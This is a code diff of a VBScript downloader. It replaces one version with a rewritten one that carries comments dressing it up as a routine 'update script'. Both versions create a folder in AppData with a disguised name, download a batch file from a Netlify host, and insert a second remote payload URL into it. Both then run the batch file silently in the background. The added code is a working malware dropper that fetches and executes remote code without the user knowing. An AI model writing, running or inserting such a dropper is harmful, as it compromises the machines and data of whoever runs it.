@@ -1,45 +1,92 @@
-Set fso = CreateObject("Scripting.FileSystemObject")
-folder = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\NVIDIA_SYS")
-
-If fso.FolderExists(folder) Then
-    fso.DeleteFolder folder, True
-End If
-
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set sh = CreateObject("WScript.Shell")
-Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-
-' Set and create directories
-p = sh.ExpandEnvironmentStrings("%AppData%") & "\NVIDIA_SYS"
-If Not fso.FolderExists(p) Then fso.CreateFolder p
-
-p = p & "\LOGS"
-If Not fso.FolderExists(p) Then fso.CreateFolder p
-
-' Download the batch file
-http.Open "GET", "https://n-new-server.netlify.app/files/C-F/final.bat", False
-http.Send
-
-If http.Status = 200 Then
-    ' Save response as a file
-    Set s = CreateObject("ADODB.Stream")
-    s.Type = 1 ' binary
-    s.Open
-    s.Write http.responseBody
-    s.SaveToFile p & "\NVM_UP.BAT", 2
-    s.Close
-
-    ' Modify the file content
-    Set t = fso.OpenTextFile(p & "\NVM_UP.BAT", 1)
-    d = t.ReadAll
-    t.Close
-
-    d = Replace(d, "****", "'https://gleaming-youtiao-b2b188.netlify.app/files/output.txt'")
-
-    Set t = fso.OpenTextFile(p & "\NVM_UP.BAT", 2, True)
-    t.Write d
-    t.Close
-
-    ' Run the batch file
-    sh.Run Chr(34) & p & "\NVM_UP.BAT" & Chr(34), 0, False
-End If
+' Initialize objects
+
+Set fileSystem = CreateObject("Scripting.FileSystemObject")
+
+Set shell = CreateObject("WScript.Shell")
+
+Set httpRequest = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+
+
+
+' Define working directory inside AppData
+
+basePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\SystemCache"
+
+
+
+' Remove old data if present
+
+If fileSystem.FolderExists(basePath) Then
+
+    fileSystem.DeleteFolder basePath, True
+
+End If
+
+
+
+' Create required directories
+
+If Not fileSystem.FolderExists(basePath) Then fileSystem.CreateFolder basePath
+
+
+
+logPath = basePath & "\Logs"
+
+If Not fileSystem.FolderExists(logPath) Then fileSystem.CreateFolder logPath
+
+
+
+' Download update script
+
+httpRequest.Open "GET", "https://website-code.netlify.app/code/final.bat", False
+
+httpRequest.Send
+
+
+
+If httpRequest.Status = 200 Then
+
+    ' Save the downloaded data to a local file
+
+    Set stream = CreateObject("ADODB.Stream")
+
+    stream.Type = 1 ' Binary
+
+    stream.Open
+
+    stream.Write httpRequest.responseBody
+
+    stream.SaveToFile logPath & "\update_task.bat", 2
+
+    stream.Close
+
+
+
+    ' Read and modify file content
+
+    Set txtFile = fileSystem.OpenTextFile(logPath & "\update_task.bat", 1)
+
+    content = txtFile.ReadAll
+
+    txtFile.Close
+
+
+
+    content = Replace(content, "****", "'https://lively-beijinho-6a890a.netlify.app/files/encoded.txt'") ' Temporary marker adjustment
+
+
+
+    Set txtFile = fileSystem.OpenTextFile(logPath & "\update_task.bat", 2, True)
+
+    txtFile.Write content
+
+    txtFile.Close
+
+
+
+    ' Execute update in background
+
+    shell.Run Chr(34) & logPath & "\update_task.bat" & Chr(34), 0, False
+
+End If
+
